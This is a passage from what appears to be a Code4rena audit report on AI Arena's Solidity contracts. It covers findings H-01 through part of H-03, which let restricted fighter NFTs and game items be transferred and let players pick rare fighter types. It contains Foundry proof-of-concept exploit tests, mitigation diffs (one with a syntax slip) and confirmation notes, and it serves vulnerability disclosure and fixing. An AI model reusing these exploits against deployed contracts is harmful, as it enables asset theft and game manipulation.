+        // The fighter wins one battle
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
+        // The player transfers the fighter to other player
+        vm.prank(address(player));
+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, "");
+        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);
+        // The fighter can't lose
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        vm.expectRevert();
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);
+        // The fighter can only win: it's unstoppable!
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
+    }
+
     /*//////////////////////////////////////////////////////////////
                                HELPERS
     //////////////////////////////////////////////////////////////*/
```

Place the PoC into `test/RankedBattle.t.sol`, and execute with

    forge test --match-test testExploitTransferStakedFighterAndPlay

</details>

### Impact 2: Another fighter can't win, game server unable to commit

<details>

```diff
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
index 6c5a1d7..196e3a0 100644
--- a/test/RankedBattle.t.sol
+++ b/test/RankedBattle.t.sol
@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
     }
 
+/// @notice Prepare two players and two fighters
+function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {
+    address player1 = vm.addr(3);
+    _mintFromMergingPool(player1);
+    uint8 fighter1 = 0;
+    _fundUserWith4kNeuronByTreasury(player1);
+    address player2 = vm.addr(4);
+    _mintFromMergingPool(player2);
+    uint8 fighter2 = 1;
+    _fundUserWith4kNeuronByTreasury(player2);
+    return (player1, player2, fighter1, fighter2);
+}
+
+/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake
+/// @notice After transferring the fighter, it wins the battle, 
+/// @notice and the second player can't exit from the stake-at-risk zone anymore.
+function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {
+    (address player1, address player2, uint8 fighter1, uint8 fighter2) = 
+        preparePlayersAndFighters();
+    vm.prank(player1);
+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);        
+    vm.prank(player2);
+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);        
+    // Fighter1 loses a battle
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);
+    // Fighter2 loses a battle
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);
+
+    // On the game server, player1 initiates a battle with fighter1,
+    // then unstakes all remaining stake from fighter1, and transfers it
+    vm.prank(address(player1));
+    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);
+    vm.prank(address(player1));
+    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, "");
+    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);
+    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);
+    // Fighter2 wins a battle, but the records can't be updated, due to underflow!
+    vm.expectRevert();
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);
+    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
+    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);
+    assertEq(wins, 0);
+    assertEq(ties, 0);
+    assertEq(losses, 2);
+}
+
     /*//////////////////////////////////////////////////////////////
                                HELPERS
     //////////////////////////////////////////////////////////////*/
```

Place the PoC into `test/RankedBattle.t.sol`, and execute with

    forge test --match-test testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer

</details>

### Recommended Mitigation Steps

Remove the incomplete checks in the inherited functions `transferFrom()` and `safeTransferFrom()` of `FighterFarm` contract, and instead to enforce the transferability restriction via the `_beforeTokenTransfer()` hook, which applies equally to all token transfers, as illustrated below.

<Details>

```diff
diff --git a/src/FighterFarm.sol b/src/FighterFarm.sol
index 06ee3e6..9f9ac54 100644
--- a/src/FighterFarm.sol
+++ b/src/FighterFarm.sol
@@ -330,40 +330,6 @@ contract FighterFarm is ERC721, ERC721Enumerable {
         );
     }
 
-    /// @notice Transfer NFT ownership from one address to another.
-    /// @dev Add a custom check for an ability to transfer the fighter.
-    /// @param from Address of the current owner.
-    /// @param to Address of the new owner.
-    /// @param tokenId ID of the fighter being transferred.
-    function transferFrom(
-        address from, 
-        address to, 
-        uint256 tokenId
-    ) 
-        public 
-        override(ERC721, IERC721)
-    {
-        require(_ableToTransfer(tokenId, to));
-        _transfer(from, to, tokenId);
-    }
-
-    /// @notice Safely transfers an NFT from one address to another.
-    /// @dev Add a custom check for an ability to transfer the fighter.
-    /// @param from Address of the current owner.
-    /// @param to Address of the new owner.
-    /// @param tokenId ID of the fighter being transferred.
-    function safeTransferFrom(
-        address from, 
-        address to, 
-        uint256 tokenId
-    ) 
-        public 
-        override(ERC721, IERC721)
-    {
-        require(_ableToTransfer(tokenId, to));
-        _safeTransfer(from, to, tokenId, "");
-    }
-
     /// @notice Rolls a new fighter with random traits.
     /// @param tokenId ID of the fighter being re-rolled.
     /// @param fighterType The fighter type.
@@ -448,7 +414,9 @@ contract FighterFarm is ERC721, ERC721Enumerable {
         internal
         override(ERC721, ERC721Enumerable)
     {
-        super._beforeTokenTransfer(from, to, tokenId);
+        if(from != address(0) && to != address(0))
+            require(_ableToTransfer(tokenId, to));
+        super._beforeTokenTransfer(from, to , tokenId);
     }
 
     /*//////////////////////////////////////////////////////////////
```

</details>

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1709#issuecomment-2004609055)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> Fixed safeTransferFrom override with data.<br>
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/2

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/9), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/41), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/6).



***

## [[H-02] Non-transferable `GameItems` can be transferred with `GameItems::safeBatchTransferFrom(...)`](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575)
*Submitted by [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575), also found by [m4ttm](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2038), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2011), [visualbits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1981), [Fulum](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1968), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1966), [GhK3Ndf](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1959), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1915), [sandy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1874), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1870), [thank\_you](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1761), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1744), [0xprinc](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1742), [Limbooo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1739), [denzi\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1723), [grearlake](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1717), [Greed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1660), [korok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1653), [josephdara](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1642), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1621), [ZanyBonzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1603), [Breeje](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1587), [hulkvision](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1584), [KmanOfficial](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1556), [CodeWasp](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1539), [DeFiHackLabs](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1497), [0xaghas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1450), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1377), [Ryonen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1373), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1312), [n0kto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1274), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1263), [Aymen0909](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1254), [jaydhales](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1249), [sashik\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1196), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1195), [0xLogos](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1176), [0x13](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1174), [Tendency](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1161), [0xpoor4ever](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1135), [PedroZurdo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1124), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1083), [ni8mare](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1071), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1021), [israeladelaja](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1007), [0xlyov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1003), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1000), [petro\_1912](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/985), [ADM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/968), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/966), [0x11singh99](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/956), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/944), [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/925), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/919), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/907), [0xWallSecurity](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/898), [cats](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/858), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/856), [ladboy233](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/847), [0xAsen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/844), [stackachu](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/843), [deadrxsezzz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/820), [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/785), [\_eperezok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/773), [pkqs90](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/765), [Josh4324](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/759), [web3pwn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/743), [jnforja](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/738), [Jorgect](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/737), [SovaSlava](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/718), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/680), [pynschon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/643), [blutorque](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/606), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/557), [0xE1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/540), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/533), [Bauchibred](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/499), [devblixt](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/493), [tpiliposian](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/482), [erosjohn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/467), [Pelz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/425), [ubl4nk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/412), [cartlex\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/393), [krikolkk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/383), [Kalogerone](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/379), [kutugu](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/369), [zhaojohnson](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/363), [shaflow2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/353), [pa6kuda](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/332), [djxploit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/324), [solmaxis69](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/287), [0rpse](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/274), [0xlemon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/261), [0xKowalski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/259), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/232), [novamanbg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/196), [DMoore](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/191), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/173), [csanuragjain](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/163), [0xBinChook](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/150), [matejdb](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/141), [tallo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/139), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/125), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/124), [sobieski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/110), [kiqo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/109), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/107), [xchen1130](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/93), [0xbranded](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/77), [oualidpro](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/59), [Timenov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/50), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/26), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/25), and [al88nsk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/18)*

The `GamesItems` contract fails to appropriately override and include essential checks within the `safeBatchTransferFrom` function, enabling the transfer of non-transferrable Game Items.

### Impact

While the `GamesItems` contract allows for the designation of Game Items as either transferrable or non-transferrable through different states and overrides the `ERC1155::safeTransferFrom(...)` function accordingly, it neglects to override the `ERC1155::safeBatchTransferFrom(...)` function. This oversight permits users to transfer Game Items that were intended to be non-transferrable.

### Proof of Concept

**Here is a test for PoC:**

> NOTE: Include the below given test in [`GameItems.t.sol`](https://github.com/code-423n4/2024-02-ai-arena/blob/main/test/GameItems.t.sol).

<details>

```solidity
    function testNonTransferableItemCanBeTransferredWithBatchTransfer() public {
        // funding owner address with 4k $NRN
        _fundUserWith4kNeuronByTreasury(_ownerAddress);

        // owner minting itme
        _gameItemsContract.mint(0, 1);

        // checking that the item is minted correctly
        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 1);

        // making the item non-transferable
        _gameItemsContract.adjustTransferability(0, false);

        vm.expectRevert();
        // trying to transfer the non-transferable item. Should revert
        _gameItemsContract.safeTransferFrom(_ownerAddress, _DELEGATED_ADDRESS, 0, 1, "");

        // checking that the item is still in the owner's account
        assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 0);
        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 1);

        // transferring the item using safeBatchTransferFrom
        uint256[] memory ids = new uint256[](1);
        ids[0] = 0;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;
        _gameItemsContract.safeBatchTransferFrom(_ownerAddress, _DELEGATED_ADDRESS, ids, amounts, "");

        // checking that the item is transferred to the delegated address
        assertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS, 0), 1);
        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 0);
    }
```
</details>

*Output:*

```bash
┌──(aamirusmani1552㉿Victus)-[/mnt/d/ai-arena-audit]
└─$ forge test --mt testNonTransferableItemCanBeTransferredWithBatchTransfer
[⠒] Compiling...
[⠃] Compiling 1 files with 0.8.13
[⠒] Solc 0.8.13 finished in 1.77s
Compiler run successful!

Running 1 test for test/GameItems.t.sol:GameItemsTest
[PASS] testNonTransferableItemCanBeTransferredWithBatchTransfer() (gas: 190756)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.32ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
### Tools Used

Foundry

### Recommended Mitigation Steps

It is recommended to override the `safeBatchTransferFrom(...)` function and include the necessary checks to prevent the transfer of non-transferrable Game Items.

<details>

```diff
+    function safeBatchTransferFrom(
+        address from,
+        address to,
+        uint256[] memory ids,
+        uint256[] memory amounts,
+        bytes memory data
+    ) public override(ERC1155) {
+        for(uint256 i; i < ids.length; i++{
+            require(allGameItemAttributes[ids[i]].transferable);
+        }
+        super.safeBatchTransferFrom(from, to, ids, amounts, data);
+    }
```

</details>

Or, consider overriding the `_safeBatchTransferFrom(...)` function as follows:

<details>

```diff
+    function _safeBatchTransferFrom(
+        address from,
+        address to,
+        uint256[] memory ids,
+        uint256[] memory amounts,
+        bytes memory data
+    ) internal override(1155) {
+        require(ids.length == amounts.length, "ERC1155: ids and amounts length mismatch");
+        require(to != address(0), "ERC1155: transfer to the zero address");
+
+        address operator = _msgSender();
+
+        _beforeTokenTransfer(operator, from, to, ids, amounts, data);
+
+        for (uint256 i = 0; i < ids.length; ++i) {
+            require(
+            uint256 id = ids[i];
+            uint256 amount = amounts[i];
+           require(allGameItemAttributes[id].transferable);
+            uint256 fromBalance = _balances[id][from];
+            require(fromBalance >= amount, "ERC1155: insufficient balance for transfer");
+            unchecked {
+                _balances[id][from] = fromBalance - amount;
+            }
+            _balances[id][to] += amount;
+        }
+
+        emit TransferBatch(operator, from, to, ids, amounts);
+
+        _afterTokenTransfer(operator, from, to, ids, amounts, data);
+
+        _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);
+    }
```
</details>

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575#issuecomment-1975505890)**

**[hickuphh3 (judge) increased severity to High](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/575#issuecomment-1977961774)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> Fixed Non-transferable `GameItems` being transferred with `GameItems::safeBatchTransferFrom`.<br>
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/4

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/10), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/42), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/4).



***

## [[H-03] Players have complete freedom to customize the fighter NFT when calling `redeemMintPass` and can redeem fighters of types Dendroid and with rare attributes](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/366)
*Submitted by [Abdessamed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/366), also found by juancito ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2045), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1635)), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1993), [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1975), [DarkTower](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1924), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1906), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1824), [0xmystery](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1773), evmboi32 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1746), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1745), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1725)), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1729), [givn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1666), [korok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1665), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1626), [denzi\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1620), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1596), [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1528), [OMEN](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1511), [stakog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1503), [ahmedaghadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1481), [Ryonen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1412), [FloatingPragma](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1408), n0kto ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1369), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1364)), [adamn000](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1346), [0rpse](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1251), [bhilare\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1151), [0xAsen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1144), [Tendency](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1074), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1035), Draiakoo ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1013), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1012)), [Archime](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/982), [ADM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/964), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/952), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/939), 0xCiphky ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/923), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/922)), [VrONTg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/909), [Velislav4o](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/884), btk ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/878), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/675)), [stackachu](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/853), [zhaojohnson](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/797), 0xvj ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/790), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/780)), [pkqs90](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/763), [devblixt](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/756), [niser93](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/736), [cats](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/733), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/652), BARW ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/567), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/292), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/291)), [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/555), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/514), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/490), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/461), [krikolkk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/414), [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/387), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/382), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/312), [0xlemon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/303), [radin100](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/299), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/237), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/200), [matejdb](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/197), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/33), [JCN](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2048), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2047), [PetarTolev](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2044), and [Zac](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1307)*

The function [redeemMintPass](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L233-L262) allows burning multiple mint passes in exchange for fighters' NFTs. It is mentioned by the sponsor that the player should not have a choice of customizing the fighters' properties and their type. However, nothing prevents a player from:

1.  Providing `uint8[] fighterTypes` of values `1` to mint fighters of types *Dendroid*.
2.  Checking previous transactions in which the [`dna` provided](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L237) led to minting fighters with rare physical attributes, copying those Dnas and passing them to the [redeemMinPass](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L237) to mint fighters with low rarity attributes. That is because creating physical attributes is [deterministic](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L83-L121), so providing the same inputs leads to generating a fighter with the same attributes.

### Impact

This issue has two major impacts:

*   Players with valid mint passes can mint fighters of type Dendroid easily.
*   Players with valid mint passes can mint easily fighters with low rarity attributes which breaks the pseudo-randomness attributes generation aspect

### Proof of Concept

For someone having valid mint passes, he calls the function [redeemMintPass](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L233) providing [`fighterTypes` array](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L235) of values *1*. For each mint pass, the inner function [\_createNewFighter](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L257) will be called passing the value *1* as `fighterType` argument which corresponds to *Dendroid*, a new fighter of type [dendroid](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L509) will be minted for the caller.

<details>

```js
function test_redeeming_dendroid_fighters_easily() public {
    uint8[2] memory numToMint = [1, 0];
    bytes memory signature = abi.encodePacked(
        hex"20d5c3e5c6b1457ee95bb5ba0cbf35d70789bad27d94902c67ec738d18f665d84e316edf9b23c154054c7824bba508230449ee98970d7c8b25cc07f3918369481c"
    );
    string[] memory _tokenURIs = new string[](1);
    _tokenURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";

    // first i have to mint an nft from the mintpass contract
    assertEq(_mintPassContract.mintingPaused(), false);
    _mintPassContract.claimMintPass(numToMint, signature, _tokenURIs);
    assertEq(_mintPassContract.balanceOf(_ownerAddress), 1);
    assertEq(_mintPassContract.ownerOf(1), _ownerAddress);

    // once owning one i can then redeem it for a fighter
    uint256[] memory _mintpassIdsToBurn = new uint256[](1);
    string[] memory _mintPassDNAs = new string[](1);
    uint8[] memory _fighterTypes = new uint8[](1);
    uint8[] memory _iconsTypes = new uint8[](1);
    string[] memory _neuralNetHashes = new string[](1);
    string[] memory _modelTypes = new string[](1);

    _mintpassIdsToBurn[0] = 1;
    _mintPassDNAs[0] = "dna";
    _fighterTypes[0] = 1; // @audit Notice that I can provide value 1 which corresponds to Dendroid type
    _neuralNetHashes[0] = "neuralnethash";
    _modelTypes[0] = "original";
    _iconsTypes[0] = 1;

    // approve the fighterfarm contract to burn the mintpass
    _mintPassContract.approve(address(_fighterFarmContract), 1);

